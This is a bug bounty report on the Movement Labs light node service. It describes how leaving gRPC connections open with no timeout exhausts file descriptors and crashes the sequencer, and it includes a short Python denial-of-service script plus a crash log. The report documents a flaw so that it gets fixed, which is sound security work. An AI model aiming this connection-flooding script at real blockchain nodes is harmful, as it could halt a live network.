# #43244 \[BC-Critical] Lack of TCP timeout allows attacker to crash the sequencer via the Light Node Service

**Submitted on Apr 4th 2025 at 02:04:09 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43244
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The LightNodeService is started by the Movement Full Node and serves gRPC requests. However this service does not have any sort of timeout on its requests. This allows an attacker to crash the sequencer via resource exhaustion.

## Vulnerability Details

the LightNodeService is bound to the ip address 0.0.0.0 in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC from outside the local network.

Each gRPC request opened to the light node creates a file descriptor on the host. By default nix OS allows 256 file descriptors per process. By spamming the light node with connection requests and leaving them hanging, an attacker can use up all available file descriptors for the light node. At this point, the light node cannot accept any further connections. The sequencer will not be able to submit new DA batches to it and the network will halt.

Further, the healthchecker set up by Movement in the default setup will actually kill the light node when this happens. In that case the sequencer full node also crashes.

## Impact Details

The sequencer will not be able to submit batches to DA. It will then also panic and crash, halting the network.

## References

`protocol-units/da/movement/protocol/light-node/src/light_node.rs`

```
async fn run_server(&self) -> Result<(), anyhow::Error> {
		let reflection = tonic_reflection::server::Builder::configure()
			.register_encoded_file_descriptor_set(movement_da_light_node_proto::FILE_DESCRIPTOR_SET)
			.build_v1()?;

		let address = self.try_service_address()?;
		info!("Server listening on: {}", address);
		Server::builder()
			.max_frame_size(1024 * 1024 * 16 - 1)
			.accept_http1(true)
			.add_service(LightNodeServiceServer::new(self.clone()))
			.add_service(reflection)
			.serve(address.parse()?)
			.await?;

		Ok(())
	}
```

## Proof of Concept

## Proof of Concept

* run movement stack by calling `just movement-full-node native build.setup.celestia-local.eth-local`
* run the following python code pointed at the address and port of the lightnodeservice

```
import socket
server_address = ('localhost', 30730)
arr = []
for _ in range(9999): # adjust for fd limit, likely 256 will suffice
     arr.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
     arr[-1].connect(server_address)
```

* observe as the light node becomes unavailable then the sequencer crashes, halting the network.

```
2025-04-04T02:00:25.723988Z  INFO movement_full_node::node::tasks::execute_settle: Receive DA heartbeat                                 
thread 'tokio-runtime-worker' panicked at /Users/<redacted>/.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.41.1/src/
runtime/blocking/shutdown.rs:51:21:                                                                                                    
Cannot drop a runtime in a context where blocking is not allowed. This happens when a runtime is dropped from within an asynchronous context.                                                                                                                                
```
